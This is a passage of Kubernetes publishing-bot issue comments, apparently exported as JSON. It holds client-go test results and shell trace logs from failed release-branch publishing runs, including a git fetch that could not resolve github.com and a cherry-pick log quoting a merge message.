k8s.io/client-go/informers/storage/v1alpha1 k8s.io/client-go/informers/storage/v1beta1 k8s.io/client-go/kubernetes k8s.io/client-go/kubernetes/fake k8s.io/client-go/kubernetes/scheme k8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1 k8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1/fake k8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1 k8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1/fake k8s.io/client-go/kubernetes/typed/apps/v1 k8s.io/client-go/kubernetes/typed/apps/v1/fake k8s.io/client-go/kubernetes/typed/apps/v1beta1 k8s.io/client-go/kubernetes/typed/apps/v1beta1/fake k8s.io/client-go/kubernetes/typed/apps/v1beta2 k8s.io/client-go/kubernetes/typed/apps/v1beta2/fake k8s.io/client-go/kubernetes/typed/authentication/v1 k8s.io/client-go/kubernetes/typed/authentication/v1/fake k8s.io/client-go/kubernetes/typed/authentication/v1beta1 k8s.io/client-go/kubernetes/typed/authentication/v1beta1/fake k8s.io/client-go/kubernetes/typed/authorization/v1 k8s.io/client-go/kubernetes/typed/authorization/v1/fake k8s.io/client-go/kubernetes/typed/authorization/v1beta1 k8s.io/client-go/kubernetes/typed/authorization/v1beta1/fake k8s.io/client-go/kubernetes/typed/autoscaling/v1 k8s.io/client-go/kubernetes/typed/autoscaling/v1/fake k8s.io/client-go/kubernetes/typed/autoscaling/v2beta1 k8s.io/client-go/kubernetes/typed/autoscaling/v2beta1/fake k8s.io/client-go/kubernetes/typed/batch/v1 k8s.io/client-go/kubernetes/typed/batch/v1/fake k8s.io/client-go/kubernetes/typed/batch/v1beta1 k8s.io/client-go/kubernetes/typed/batch/v1beta1/fake k8s.io/client-go/kubernetes/typed/batch/v2alpha1 k8s.io/client-go/kubernetes/typed/batch/v2alpha1/fake k8s.io/client-go/kubernetes/typed/certificates/v1beta1 k8s.io/client-go/kubernetes/typed/certificates/v1beta1/fake k8s.io/client-go/kubernetes/typed/core/v1 k8s.io/client-go/kubernetes/typed/core/v1/fake k8s.io/client-go/kubernetes/typed/events/v1beta1 k8s.io/client-go/kubernetes/typed/events/v1beta1/fake k8s.io/client-go/kubernetes/typed/extensions/v1beta1 k8s.io/client-go/kubernetes/typed/extensions/v1beta1/fake k8s.io/client-go/kubernetes/typed/networking/v1 k8s.io/client-go/kubernetes/typed/networking/v1/fake k8s.io/client-go/kubernetes/typed/policy/v1beta1 k8s.io/client-go/kubernetes/typed/policy/v1beta1/fake k8s.io/client-go/kubernetes/typed/rbac/v1 k8s.io/client-go/kubernetes/typed/rbac/v1/fake k8s.io/client-go/kubernetes/typed/rbac/v1alpha1 k8s.io/client-go/kubernetes/typed/rbac/v1alpha1/fake k8s.io/client-go/kubernetes/typed/rbac/v1beta1 k8s.io/client-go/kubernetes/typed/rbac/v1beta1/fake k8s.io/client-go/kubernetes/typed/scheduling/v1alpha1 k8s.io/client-go/kubernetes/typed/scheduling/v1alpha1/fake k8s.io/client-go/kubernetes/typed/scheduling/v1beta1 k8s.io/client-go/kubernetes/typed/scheduling/v1beta1/fake k8s.io/client-go/kubernetes/typed/settings/v1alpha1 k8s.io/client-go/kubernetes/typed/settings/v1alpha1/fake k8s.io/client-go/kubernetes/typed/storage/v1 k8s.io/client-go/kubernetes/typed/storage/v1/fake k8s.io/client-go/kubernetes/typed/storage/v1alpha1 k8s.io/client-go/kubernetes/typed/storage/v1alpha1/fake k8s.io/client-go/kubernetes/typed/storage/v1beta1 k8s.io/client-go/kubernetes/typed/storage/v1beta1/fake k8s.io/client-go/listers/admissionregistration/v1alpha1 k8s.io/client-go/listers/admissionregistration/v1beta1 k8s.io/client-go/listers/apps/v1 k8s.io/client-go/listers/apps/v1beta1 k8s.io/client-go/listers/apps/v1beta2 k8s.io/client-go/listers/authentication/v1 k8s.io/client-go/listers/authentication/v1beta1 k8s.io/client-go/listers/authorization/v1 k8s.io/client-go/listers/authorization/v1beta1 k8s.io/client-go/listers/autoscaling/v1 k8s.io/client-go/listers/autoscaling/v2beta1 k8s.io/client-go/listers/batch/v1 k8s.io/client-go/listers/batch/v1beta1 k8s.io/client-go/listers/batch/v2alpha1 k8s.io/client-go/listers/certificates/v1beta1 k8s.io/client-go/listers/core/v1 k8s.io/client-go/listers/events/v1beta1 k8s.io/client-go/listers/extensions/v1beta1 k8s.io/client-go/listers/imagepolicy/v1alpha1 k8s.io/client-go/listers/networking/v1 k8s.io/client-go/listers/policy/v1beta1 k8s.io/client-go/listers/rbac/v1 k8s.io/client-go/listers/rbac/v1alpha1 k8s.io/client-go/listers/rbac/v1beta1 k8s.io/client-go/listers/scheduling/v1alpha1 k8s.io/client-go/listers/scheduling/v1beta1 k8s.io/client-go/listers/settings/v1alpha1 k8s.io/client-go/listers/storage/v1 k8s.io/client-go/listers/storage/v1alpha1 k8s.io/client-go/listers/storage/v1beta1 k8s.io/client-go/pkg/apis/clientauthentication k8s.io/client-go/pkg/apis/clientauthentication/install k8s.io/client-go/pkg/apis/clientauthentication/v1alpha1 k8s.io/client-go/pkg/apis/clientauthentication/v1beta1 k8s.io/client-go/pkg/version k8s.io/client-go/plugin/pkg/client/auth k8s.io/client-go/plugin/pkg/client/auth/azure k8s.io/client-go/plugin/pkg/client/auth/exec k8s.io/client-go/plugin/pkg/client/auth/gcp k8s.io/client-go/plugin/pkg/client/auth/oidc k8s.io/client-go/plugin/pkg/client/auth/openstack k8s.io/client-go/rest k8s.io/client-go/rest/fake k8s.io/client-go/rest/watch k8s.io/client-go/restmapper k8s.io/client-go/scale k8s.io/client-go/scale/fake k8s.io/client-go/scale/scheme k8s.io/client-go/scale/scheme/appsint k8s.io/client-go/scale/scheme/appsv1beta1 k8s.io/client-go/scale/scheme/appsv1beta2 k8s.io/client-go/scale/scheme/autoscalingv1 k8s.io/client-go/scale/scheme/extensionsint k8s.io/client-go/scale/scheme/extensionsv1beta1 k8s.io/client-go/testing k8s.io/client-go/third_party/forked/golang/template k8s.io/client-go/tools/auth k8s.io/client-go/tools/bootstrap/token/api k8s.io/client-go/tools/bootstrap/token/util k8s.io/client-go/tools/cache k8s.io/client-go/tools/cache/testing k8s.io/client-go/tools/clientcmd k8s.io/client-go/tools/clientcmd/api k8s.io/client-go/tools/clientcmd/api/latest k8s.io/client-go/tools/clientcmd/api/v1 k8s.io/client-go/tools/leaderelection k8s.io/client-go/tools/leaderelection/resourcelock k8s.io/client-go/tools/metrics k8s.io/client-go/tools/pager k8s.io/client-go/tools/portforward k8s.io/client-go/tools/record k8s.io/client-go/tools/reference k8s.io/client-go/tools/remotecommand k8s.io/client-go/transport k8s.io/client-go/transport/spdy k8s.io/client-go/util/buffer k8s.io/client-go/util/cert k8s.io/client-go/util/cert/triple k8s.io/client-go/util/certificate k8s.io/client-go/util/certificate/csr k8s.io/client-go/util/connrotation k8s.io/client-go/util/exec k8s.io/client-go/util/flowcontrol k8s.io/client-go/util/homedir k8s.io/client-go/util/integer k8s.io/client-go/util/jsonpath k8s.io/client-go/util/retry k8s.io/client-go/util/testing k8s.io/client-go/util/workqueue\n>\tok  \tk8s.io/client-go/deprecated-dynamic\t(cached)\n>\tok  \tk8s.io/client-go/discovery\t(cached)\n>\tok  \tk8s.io/client-go/discovery/cached\t(cached)\n>\tok  \tk8s.io/client-go/discovery/fake\t(cached)\n>\tok  \tk8s.io/client-go/dynamic\t(cached)\n>\t?   \tk8s.io/client-go/dynamic/fake\t[no test files]\n>\t?   \tk8s.io/client-go/examples/create-update-delete-deployment\t[no test files]\n>\t?   \tk8s.io/client-go/examples/in-cluster-client-configuration\t[no test files]\n>\t?   \tk8s.io/client-go/examples/out-of-cluster-client-configuration\t[no test files]\n>\t?   \tk8s.io/client-go/examples/workqueue\t[no test files]\n>\t?   \tk8s.io/client-go/informers\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/certificates\t[no test files]\n>\t?   \tk8s.io/client-go/informers/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/core\t[no test files]\n>\t?   \tk8s.io/client-go/informers/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/events\t[no test files]\n>\t?   \tk8s.io/client-go/informers/events/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/extensions\t[no test files]\n>\t?   \tk8s.io/client-go/informers/extensions/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/internalinterfaces\t[no test files]\n>\t?   \tk8s.io/client-go/informers/networking\t[no test files]\n>\t?   \tk8s.io/client-go/informers/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/policy\t[no test files]\n>\t?   \tk8s.io/client-go/informers/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/settings\t[no test files]\n>\t?   \tk8s.io/client-go/informers/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/scheme\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta2/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v2beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v2alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/certificates/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/core/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/events/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/events/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/extensions/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/extensions/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/networking/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/policy/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/settings/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/listers/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authentication/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authorization/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authorization/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/events/v1beta1\t[no test files]\n>\tok  \tk8s.io/client-go/listers/extensions/v1beta1\t(cached)\n>\t?   \tk8s.io/client-go/listers/imagepolicy/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/scheduling/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication/install\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/version\t[no test files]\n>\t?   \tk8s.io/client-go/plugin/pkg/client/auth\t[no test files]\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/azure\t(cached)\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/exec\t0.246s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/gcp\t(cached)\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/oidc\t(cached)\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/openstack\t(cached)\n>\tok  \tk8s.io/client-go/rest\t(cached)\n>\t?   \tk8s.io/client-go/rest/fake\t[no test files]\n>\tok  \tk8s.io/client-go/rest/watch\t(cached)\n>\tok  \tk8s.io/client-go/restmapper\t(cached)\n>\tok  \tk8s.io/client-go/scale\t(cached)\n>\t?   \tk8s.io/client-go/scale/fake\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsint\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsv1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsv1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/autoscalingv1\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/extensionsint\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/extensionsv1beta1\t[no test files]\n>\tok  \tk8s.io/client-go/testing\t(cached)\n>\t?   \tk8s.io/client-go/third_party/forked/golang/template\t[no test files]\n>\tok  \tk8s.io/client-go/tools/auth\t(cached)\n>\t?   \tk8s.io/client-go/tools/bootstrap/token/api\t[no test files]\n>\tok  \tk8s.io/client-go/tools/bootstrap/token/util\t(cached)\n>\tok  \tk8s.io/client-go/tools/cache\t(cached)\n>\tok  \tk8s.io/client-go/tools/cache/testing\t(cached)\n>\tok  \tk8s.io/client-go/tools/clientcmd\t(cached)\n>\tok  \tk8s.io/client-go/tools/clientcmd/api\t(cached)\n>\t?   \tk8s.io/client-go/tools/clientcmd/api/latest\t[no test files]\n>\t?   \tk8s.io/client-go/tools/clientcmd/api/v1\t[no test files]\n>\tok  \tk8s.io/client-go/tools/leaderelection\t(cached)\n>\t?   \tk8s.io/client-go/tools/leaderelection/resourcelock\t[no test files]\n>\t?   \tk8s.io/client-go/tools/metrics\t[no test files]\n>\tok  \tk8s.io/client-go/tools/pager\t(cached)\n>\tok  \tk8s.io/client-go/tools/portforward\t(cached)\n>\tok  \tk8s.io/client-go/tools/record\t(cached)\n>\tok  \tk8s.io/client-go/tools/reference\t(cached)\n>\tok  \tk8s.io/client-go/tools/remotecommand\t(cached)\n>\tok  \tk8s.io/client-go/transport\t(cached)\n>\t?   \tk8s.io/client-go/transport/spdy\t[no test files]\n>\tok  \tk8s.io/client-go/util/buffer\t(cached)\n>\tok  \tk8s.io/client-go/util/cert\t0.043s\n>\t?   \tk8s.io/client-go/util/cert/triple\t[no test files]\n>\tok  \tk8s.io/client-go/util/certificate\t(cached)\n>\tok  \tk8s.io/client-go/util/certificate/csr\t(cached)\n>\tok  \tk8s.io/client-go/util/connrotation\t(cached)\n>\t?   \tk8s.io/client-go/util/exec\t[no test files]\n>\tok  \tk8s.io/client-go/util/flowcontrol\t(cached)\n>\t?   \tk8s.io/client-go/util/homedir\t[no test files]\n>\tok  \tk8s.io/client-go/util/integer\t(cached)\n>\tok  \tk8s.io/client-go/util/jsonpath\t(cached)\n>\tok  \tk8s.io/client-go/util/retry\t(cached)\n>\tok  \tk8s.io/client-go/util/testing\t(cached)\n>\tok  \tk8s.io/client-go/util/workqueue\t(cached)\n>[07 Sep 18 10:38 UTC]: Successfully constructed release-8.0\n>[07 Sep 18 10:38 UTC]: /publish_scripts/construct.sh client-go release-1.12 release-9.0 apimachinery:release-1.12,api:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/client-go kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\" \n>\t+ '[' '!' 13 -eq 13 ']'\n>\t+ REPO=client-go\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-9.0\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/client-go\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tfatal: unable to access 'https://github.com/kubernetes/client-go/': Could not resolve host: github.com\n>[07 Sep 18 10:39 UTC]: exit status 128\n>    \t+ '[' '!' 13 -eq 13 ']'\n>    \t+ REPO=client-go\n>    \t+ SRC_BRANCH=release-1.12\n>    \t+ DST_BRANCH=release-9.0\n>    \t+ DEPS=apimachinery:release-1.12,api:release-1.12\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/client-go\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \tfatal: unable to access 'https://github.com/kubernetes/client-go/': Could not resolve host: github.com\n>\n>[07 Sep 18 10:39 UTC]: exit status 128```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-419577991):\n\n>/reopen\n>\n>The last publishing run failed: exit status 129\n>```\n>...master '!=' master ']'\n>\t++ commit-subject b5382c347ee5349910d386a1be0785b735692d54\n>\t++ git show --format=%s -q b5382c347ee5349910d386a1be0785b735692d54\n>\tCherry-picking source dropped-merge b5382c347ee5349910d386a1be0785b735692d54: Merge pull request #67938 from soltysh/sample_plugin.\n>\t+ echo 'Cherry-picking source dropped-merge b5382c347ee5349910d386a1be0785b735692d54: Merge pull request #67938 from soltysh/sample_plugin.'\n>\t++ commit-date b5382c347ee5349910d386a1be0785b735692d54\n>\t++ git show --format=%aD -q b5382c347ee5349910d386a1be0785b735692d54\n>\t+ local 'date=Tue, 28 Aug 2018 10:02:01 -0700'\n>\t+++ commit-message b5382c347ee5349910d386a1be0785b735692d54\n>\t+++ git show --format=%B -q b5382c347ee5349910d386a1be0785b735692d54\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: b5382c347ee5349910d386a1be0785b735692d54'\n>\t++ GIT_COMMITTER_DATE='Tue, 28 Aug 2018 10:02:01 -0700'\n>\t++ GIT_AUTHOR_DATE='Tue, 28 Aug 2018 10:02:01 -0700'\n>\t++ git commit-tree -p 068ebcf28c7f10ec02a922762b6e044ad6aba0ff -p HEAD -m 'Merge pull request #67938 from soltysh/sample_plugin\n>\n>\tAutomatic merge from submit-queue (batch tested with PRs 67938, 66719, 67883). If you want to cherry-pick this change to another branch, please follow the instructions <a href=\"https://github.com/kubernetes/community/blob/master/contributors/devel/cherry-picks.md\">here</a>.\n>\n>\tAdd \"sample-plugin\" staging repo\n>\n>\tSupersedes https://github.com/kubernetes/kubernetes/pull/67729\r\n>\t\r\n>\tShowcases usage of the new `kubectl` plugins mechanism.\r\n>\tShowcases usage of the new `cli-runtime` repo from a third-party plugin\r\n>\t\r\n>\tSee README.md for details on what this plugin actually does.\r\n>\t\r\n>\t/assign @smarterclayton @sttts @juanvallejo \r\n>\t\r\n>\t/sig cli\r\n>\t\r\n>\t**Release note**:\r\n>\t```release-note\r\n>\tAdds sample-cli-plugin staging repository\r\n>\t```\n>\n>\tKubernetes-commit: b5382c347ee5349910d386a1be0785b735692d54' 'HEAD^{tree}'\n>\t+ local dst_new_merge=0b232ff14bc0b1626bc95be6787a57f454002aaf\n>\t+ git reset -q --hard 0b232ff14bc0b1626bc95be6787a57f454002aaf\n>\t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=0b232ff14bc0b1626bc95be6787a57f454002aaf\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f 